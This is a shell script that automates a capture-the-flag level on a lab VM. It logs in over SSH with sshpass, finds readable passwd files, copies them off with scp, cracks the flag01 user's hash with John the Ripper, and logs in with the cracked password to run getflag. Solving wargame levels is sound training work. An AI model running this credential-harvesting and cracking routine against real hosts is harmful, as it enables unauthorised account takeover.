#!/bin/sh -eu

PREVIOUS_FLAG=../../level00/flag
ADDRESS=192.168.122.214
PORT=4242
TMP=./tmp
FLAG=../flag

# Connect to the virtual machine using SSH and run the script
# to find every `passwd` file that can be read by the `level01` user
READABLE_PASSWD_FILES=$(
	sshpass -f ${PREVIOUS_FLAG} <find_readable_passwd_files.sh 2>/dev/null \
		ssh -p ${PORT} level01@${ADDRESS} \
			sh -s
)

rm -rf ~/.john
mkdir ${TMP}
for READABLE_PASSWD_FILE in ${READABLE_PASSWD_FILES}; do
	LOCAL_FILE=${TMP}/$(
		echo ${READABLE_PASSWD_FILE} | sed 's/\./_/g' | sed 's/\//./g' | sed 's/^\.//g'
	)

	# Copy the `passwd` file from the virtual machine to the host + set its permissions
	sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
		scp -P ${PORT} level01@${ADDRESS}:${READABLE_PASSWD_FILE} ${LOCAL_FILE}
	chmod 600 ${LOCAL_FILE}

	# Keep only the line(s) of the `flag01` user
	if ! grep flag01 ${LOCAL_FILE} >${LOCAL_FILE}.tmp; then
		rm ${LOCAL_FILE} ${LOCAL_FILE}.tmp
		continue
	fi
	mv ${LOCAL_FILE}.tmp ${LOCAL_FILE}

	# Crack the password(s) of the `flag01` user using John the Ripper
	POTENTIAL_PASSWORDS=$(john ${LOCAL_FILE} 2>/dev/null | tail -n +2 | egrep -o '^[^ ]+')

	for POTENTIAL_PASSWORD in ${POTENTIAL_PASSWORDS}; do
		# Try to connect to the virtual machine and run the `getflag` command as the `flag01` user
		if
			sshpass -p ${POTENTIAL_PASSWORD} >${FLAG} 2>/dev/null \
				ssh -p ${PORT} flag01@${ADDRESS} "getflag | egrep -o '[^ ]+$'"
		then
			# Found the correct password and saved the token
			rm -rf ${TMP}
			exit 0
		fi
	done
done

# Did not find the correct password, and thus could not get the token
rm -f ${FLAG}
rm -rf ${TMP}
echo >&2 'error: none of the potential passwords is the correct one'
exit 1
